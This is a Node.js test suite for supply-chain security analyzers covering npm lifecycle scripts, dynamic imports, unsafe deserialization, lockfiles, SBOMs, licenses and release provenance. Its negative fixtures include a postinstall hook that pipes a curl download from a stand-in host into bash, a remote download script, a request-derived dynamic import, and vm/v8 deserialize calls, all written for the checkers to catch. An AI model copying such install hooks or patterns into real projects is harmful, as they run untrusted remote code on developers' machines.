import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { analyzeNpmLifecycle } from "./check-npm-lifecycle.mjs";
import { analyzeCodeownersSecurityPaths } from "./check-codeowners-security-paths.mjs";
import { analyzeDynamicImportSpecifiers } from "./check-dynamic-import-specifiers.mjs";
import { analyzeDependencyPolicy } from "./check-dependency-policy.mjs";
import { analyzeInstallScriptRisk } from "./check-install-script-risk.mjs";
import { analyzeLicenseSbom } from "./check-license-sbom.mjs";
import { analyzeLockfileIntegrityDrift } from "./check-lockfile-integrity-drift.mjs";
import { analyzeNpmScriptIntegrity } from "./check-npm-script-integrity.mjs";
import { analyzeReleaseArtifactProvenance } from "./check-release-artifact-provenance.mjs";
import { analyzeSbomIntegrity } from "./check-sbom-integrity.mjs";
import { analyzeUnsafeDeserialization } from "./check-unsafe-deserialization.mjs";

function write(root, rel, content) {
  const abs = path.join(root, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, content);
}

function writeJson(root, rel, value) {
  write(root, rel, `${JSON.stringify(value, null, 2)}\n`);
}

function minimalPackageJson(extraScripts = {}) {
  return {
    name: "fixture-app",
    version: "0.0.0",
    dependencies: { leftpad: "^1.0.0" },
    devDependencies: {},
    scripts: {
      "check:lockfile-integrity-drift": "node scripts/check-lockfile-integrity-drift.mjs",
      "check:dependency-policy": "node scripts/check-dependency-policy.mjs",
      "check:sbom-integrity": "node scripts/check-sbom-integrity.mjs",
      "check:license-sbom": "node scripts/check-license-sbom.mjs",
      "check:install-script-risk": "node scripts/check-install-script-risk.mjs",
      "check:npm-script-integrity": "node scripts/check-npm-script-integrity.mjs",
      "check:npm-lifecycle": "node scripts/check-npm-lifecycle.mjs",
      "check:dynamic-import-specifiers": "node scripts/check-dynamic-import-specifiers.mjs",
      "check:unsafe-deserialization": "node scripts/check-unsafe-deserialization.mjs",
      "check:release-artifact-provenance": "node scripts/check-release-artifact-provenance.mjs",
      ...extraScripts,
    },
  };
}

function minimalLockfile(packageMeta = {}) {
  return {
    name: "fixture-app",
    lockfileVersion: 3,
    packages: {
      "": {
        name: "fixture-app",
        version: "0.0.0",
        dependencies: { leftpad: "^1.0.0" },
        devDependencies: {},
      },
      "node_modules/leftpad": {
        version: "1.0.0",
        resolved: "https://registry.npmjs.org/leftpad/-/leftpad-1.0.0.tgz",
        integrity: "sha512-test",
        ...packageMeta,
      },
    },
  };
}

function minimalSbom(license = "MIT") {
  return {
    bomFormat: "CycloneDX",
    specVersion: "1.6",
    serialNumber: "urn:uuid:11111111-1111-4111-8111-111111111111",
    version: 1,
    metadata: {
      component: {
        type: "application",
        name: "fixture-app",
        version: "0.0.0",
        "bom-ref": "fixture-app@0.0.0",
        purl: "pkg:npm/fixture-app@0.0.0",
      },
    },
    components: [
      {
        type: "library",
        name: "leftpad",
        version: "1.0.0",
        "bom-ref": "pkg:npm/leftpad@1.0.0",
        purl: "pkg:npm/leftpad@1.0.0",
        licenses: [{ license: { id: license } }],
      },
    ],
    dependencies: [{ ref: "fixture-app@0.0.0", dependsOn: ["pkg:npm/leftpad@1.0.0"] }],
  };
}

function writeSupplyChainFixture(root, options = {}) {
  writeJson(root, "package.json", minimalPackageJson(options.extraScripts));
  writeJson(root, "package-lock.json", minimalLockfile(options.packageMeta));
  writeJson(root, "cyclonedx-sbom.json", minimalSbom(options.license));
  writeJson(root, "artifacts/license-allowlist.json", { families: ["MIT"] });
  writeJson(root, "artifacts/supply-chain-install-script-allowlist.json", {
    version: 1,
    entries: options.installAllowlistEntries ?? [],
  });
  writeJson(root, "artifacts/dependency-review-policy.json", {
    version: 1,
    failOnSeverity: "high",
    requiredChecks: [
      "check:dependency-policy",
      "check:lockfile-integrity-drift",
      "check:sbom-integrity",
      "check:license-sbom",
      "check:install-script-risk",
      "check:npm-script-integrity",
      "check:npm-lifecycle",
      "check:dynamic-import-specifiers",
      "check:unsafe-deserialization",
      "check:release-artifact-provenance",
    ],
    requiredArtifacts: [
      "package-lock.json",
      "cyclonedx-sbom.json",
      "artifacts/license-allowlist.json",
      "artifacts/supply-chain-install-script-allowlist.json",
      "artifacts/dependency-review-policy.json",
    ],
    dependencyReview: {
      mode: "artifact-and-audit",
      reason: "Fixture enforces uploaded SBOM artifacts and npm audit output for dependency review.",
    },
  });
  write(
    root,
    ".github/workflows/ci.yml",
    [
      "npm run check:dependency-policy",
      "npm run check:lockfile-integrity-drift",
      "npm run check:sbom-integrity",
      "npm run check:license-sbom",
      "npm run check:install-script-risk",
      "npm run check:npm-script-integrity",
      "npm run check:npm-lifecycle",
      "npm run check:dynamic-import-specifiers",
      "npm run check:unsafe-deserialization",
      "npm run check:release-artifact-provenance",
      "actions/upload-artifact",
      "cyclonedx-sbom.json",
      "npm run report:dependency-risk",
    ].join("\n")
  );
  write(
    root,
    "scripts/pipelines/pipeline-security-comprehensive.mjs",
    [
      '"check:dependency-policy"',
      '"check:lockfile-integrity-drift"',
      '"check:sbom-integrity"',
      '"check:license-sbom"',
      '"check:install-script-risk"',
      '"check:npm-script-integrity"',
      '"check:npm-lifecycle"',
      '"check:dynamic-import-specifiers"',
      '"check:unsafe-deserialization"',
      '"check:release-artifact-provenance"',
    ].join("\n")
  );
}

function writeReleaseProvenanceFixture(root, options = {}) {
  writeJson(root, "package.json", {
    scripts: {
      "check:release-artifact-provenance": "node scripts/check-release-artifact-provenance.mjs",
      "preflight:release": "node scripts/release-preflight.mjs",
      "verify": "npm run pipeline:verify",
      "check:comprehensive-pass": "node scripts/comprehensive-pass.mjs",
      "test:e2e:current-product": "npm run test:e2e:current-product",
      "test:e2e:current-product": "playwright test --grep @current-product",
      "test:e2e": "playwright test",
      "release:checklist": "node scripts/pipelines/pipeline-release-checklist.mjs",
      ...(options.scripts ?? {}),
    },
  });
  write(
    root,
    ".github/workflows/ci.yml",
    [
      "actions/checkout@pinned",
      "actions/setup-node@pinned",
      "osv-scanner-action",
      "gitleaks-action@pinned",
      "npm run check:release-artifact-provenance",
      "npm run sbom",
      "npm run check:lockfile-integrity-drift",
      "npm run check:sbom-integrity",
    ].join("\n")
  );
  write(
    root,
    "scripts/pipelines/pipeline-release-checklist.mjs",
    [
      '"preflight:release"',
      '"check:release-evidence"',
      '"check:release-suite-current"',
      '"verify"',
      '"check:comprehensive-pass"',
      '"test:e2e:current-product"',
      '"test:e2e"',
    ].filter((line) => line !== options.omitReleaseStep).join("\n")
  );
  write(root, "scripts/pipelines/pipeline-security-comprehensive.mjs", '"check:release-artifact-provenance"\n');
}

test("analyzeNpmLifecycle rejects risky install lifecycle scripts", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-npm-life-bad-"));
  write(root, "package.json", JSON.stringify({ scripts: { postinstall: "curl https://example.test/install.sh | bash", test: "node ok.mjs" } }));
  const report = analyzeNpmLifecycle(root);
  assert.equal(report.ok, false);
  assert.deepEqual(report.issues, [{ issue: "risky_npm_lifecycle_script", script: "postinstall" }]);
});

test("analyzeNpmLifecycle accepts absent or safe lifecycle scripts", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-npm-life-ok-"));
  write(root, "package.json", JSON.stringify({ scripts: { test: "vitest run" } }));
  const report = analyzeNpmLifecycle(root);
  assert.equal(report.ok, true);
});

test("analyzeCodeownersSecurityPaths requires security-sensitive ownership patterns", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-codeowners-bad-"));
  write(root, ".github/CODEOWNERS", "src/app/api/ @security\n");
  const report = analyzeCodeownersSecurityPaths(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "missing_codeowner_coverage" && issue.path === ".github/CODEOWNERS"));
});

test("analyzeCodeownersSecurityPaths accepts complete ownership patterns", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-codeowners-ok-"));
  write(root, ".github/CODEOWNERS", ".github/CODEOWNERS @security\n");
  const report = analyzeCodeownersSecurityPaths(root);
  assert.equal(report.ok, true);
});

test("analyzeDynamicImportSpecifiers rejects non-literal dynamic imports", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-dyn-import-bad-"));
  write(root, "src/app/api/demo/route.ts", "const name = request.url; await import(name);\n");
  const report = analyzeDynamicImportSpecifiers(root);
  assert.equal(report.ok, false);
  assert.deepEqual(report.issues, [{ issue: "non_literal_dynamic_import", file: "src/app/api/demo/route.ts", specifier: "name" }]);
});

test("analyzeDynamicImportSpecifiers accepts literal dynamic imports", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-dyn-import-ok-"));
  write(root, "src/app/api/demo/route.ts", "await import(\"@/lib/demo\");\n");
  const report = analyzeDynamicImportSpecifiers(root);
  assert.equal(report.ok, true);
});

test("analyzeUnsafeDeserialization rejects VM and deserialize usage", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-unsafe-deser-bad-"));
  write(root, "src/lib/demo.ts", 'import vm from "node:vm";\nimport { deserialize } from "node:v8";\nvm.runInNewContext("payload");\nv8.deserialize(bytes);\n');
  const report = analyzeUnsafeDeserialization(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "unsafe_deserialization_or_vm_import"));
  assert(report.issues.some((issue) => issue.issue === "unsafe_v8_deserialize_import"));
  assert(report.issues.some((issue) => issue.issue === "unsafe_vm_execution_call"));
  assert(report.issues.some((issue) => issue.issue === "unsafe_deserialization_call"));
});

test("analyzeUnsafeDeserialization accepts ordinary JSON parsing and heap snapshots", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-unsafe-deser-ok-"));
  write(root, "src/lib/demo.ts", "export function parse(raw: string) { return JSON.parse(raw); }\n");
  write(root, "scripts/heap-snapshot-staging.mjs", 'import { writeHeapSnapshot } from "node:v8";\nwriteHeapSnapshot(".tmp/test.heapsnapshot");\n');
  const report = analyzeUnsafeDeserialization(root);
  assert.equal(report.ok, true);
});

test("analyzeNpmScriptIntegrity rejects risky npm scripts and missing node targets", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-npm-script-bad-"));
  writeJson(root, "package.json", { scripts: { "check:bad": "node scripts/missing.mjs", bootstrap: "curl https://example.test/install.sh" } });
  write(root, "scripts/security-check-generic.mjs", "export {};\n");
  const report = analyzeNpmScriptIntegrity(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "missing_node_script_file"));
  assert(report.issues.some((issue) => issue.issue === "remote_shell_download"));
});

test("analyzeNpmScriptIntegrity accepts local node script references", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-npm-script-ok-"));
  writeJson(root, "package.json", { scripts: { "check:ok": "node scripts/check-ok.mjs" } });
  write(root, "scripts/check-ok.mjs", "console.log('ok');\n");
  write(root, "scripts/security-check-generic.mjs", "export {};\n");
  const report = analyzeNpmScriptIntegrity(root);
  assert.equal(report.ok, true);
});

test("analyzeReleaseArtifactProvenance accepts complete release provenance wiring", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-release-prov-ok-"));
  writeReleaseProvenanceFixture(root);
  const report = analyzeReleaseArtifactProvenance(root);
  assert.equal(report.ok, true);
});

test("analyzeReleaseArtifactProvenance rejects missing release checklist steps", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-release-prov-bad-"));
  writeReleaseProvenanceFixture(root, { omitReleaseStep: '"check:comprehensive-pass"' });
  const report = analyzeReleaseArtifactProvenance(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "missing_release_checklist_step"));
});

test("objective 40 supply-chain analyzers accept a complete dependency review fixture", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-supply-chain-ok-"));
  writeSupplyChainFixture(root);

  assert.equal(analyzeLockfileIntegrityDrift(root).ok, true);
  assert.equal(analyzeSbomIntegrity(root).ok, true);
  assert.equal(analyzeLicenseSbom(root).ok, true);
  assert.equal(analyzeInstallScriptRisk(root).ok, true);
  assert.equal(analyzeDependencyPolicy(root).ok, true);
});

test("analyzeLockfileIntegrityDrift rejects stale root dependency entries", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-lockfile-bad-"));
  writeSupplyChainFixture(root);
  const lockfile = minimalLockfile();
  lockfile.packages[""].dependencies.extra = "^2.0.0";
  writeJson(root, "package-lock.json", lockfile);
  const report = analyzeLockfileIntegrityDrift(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "stale_lockfile_root_dependency"));
});

test("analyzeSbomIntegrity rejects missing direct dependency coverage", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-sbom-bad-"));
  writeSupplyChainFixture(root);
  const sbom = minimalSbom();
  sbom.components = [];
  writeJson(root, "cyclonedx-sbom.json", sbom);
  const report = analyzeSbomIntegrity(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "direct_dependency_missing_from_sbom"));
});

test("analyzeLicenseSbom rejects non-allowlisted SBOM licenses", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-license-bad-"));
  writeSupplyChainFixture(root, { license: "GPL-2.0-only" });
  const report = analyzeLicenseSbom(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "non_allowlisted_license"));
});

test("analyzeInstallScriptRisk requires reviewed install-script allowlist entries", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-install-risk-bad-"));
  writeSupplyChainFixture(root, { packageMeta: { hasInstallScript: true } });
  const report = analyzeInstallScriptRisk(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "unreviewed_install_script_package"));
});

test("analyzeDependencyPolicy rejects missing Objective 40 check wiring", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-dep-policy-bad-"));
  writeSupplyChainFixture(root);
  writeJson(root, "artifacts/dependency-review-policy.json", {
    version: 1,
    failOnSeverity: "high",
    requiredChecks: ["check:lockfile-integrity-drift"],
    requiredArtifacts: ["cyclonedx-sbom.json"],
    dependencyReview: { mode: "artifact-and-audit", reason: "too short" },
  });
  const report = analyzeDependencyPolicy(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "dependency_policy_missing_required_check"));
});

test("analyzeDependencyPolicy rejects missing comprehensive supply-chain pipeline wiring", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "oblixa-dep-policy-pipeline-bad-"));
  writeSupplyChainFixture(root);
  write(root, "scripts/pipelines/pipeline-security-comprehensive.mjs", '"check:dependency-policy"\n');
  const report = analyzeDependencyPolicy(root);
  assert.equal(report.ok, false);
  assert(report.issues.some((issue) => issue.issue === "missing_security_pipeline_supply_chain_step"));
});
